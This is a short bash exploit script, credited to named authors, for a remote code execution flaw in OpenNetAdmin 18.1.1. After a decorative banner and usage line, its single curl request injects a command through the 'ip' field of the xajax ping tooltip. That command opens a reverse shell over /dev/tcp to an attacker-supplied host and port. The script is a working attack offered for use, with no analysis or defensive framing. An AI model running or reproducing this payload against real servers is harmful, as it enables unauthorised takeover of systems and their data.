#!/bin/bash

#Original Author:  mattpascoe (2019)
#Revision Author:  d4t4s3c    (2020)
#Twitter:          @d4t4s3c
#Email:            d4t4s3c@protonmail.com
#GitHub:           www.github.com/d4t4s3c

#colors
b="\033[1;37m"
r="\033[1;31m"
a="\033[1;33m"
cy="\033[0;96m"
nc="\e[0m"

#var
v1='[i]'
v2='-='
v3='=-'

function banner(){
	echo ""
    echo -e "$r _____             _____     _   _____   _       _      $nc"
    echo -e "$r|     |___ ___ ___|   | |___| |_|  _  |_| |_____|_|___  $nc"
    echo -e "$r|  |  | . | -_|   | | | | -_|  _|     | . |     | |   | $nc"
    echo -e "$r|_____|  _|___|_|_|_|___|___|_| |__|__|___|_|_|_|_|_|_| $nc"
    echo -e "$r      |_|                                               $nc"
    echo -e "$b$v2$cy Exploit Version: 18.1.1 $b===$cy Remote Code Execution $b$v3$nc"
}

function main(){
    echo ""
    echo -e "$a$v1$b usage: $r./OpenNetAdmin.sh <URL> <LHOST> <LPORT>$nc"
}

banner
main
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$2%2F$3%200%3E%261%22&xajaxargs[]=ping" "$1"
exit 1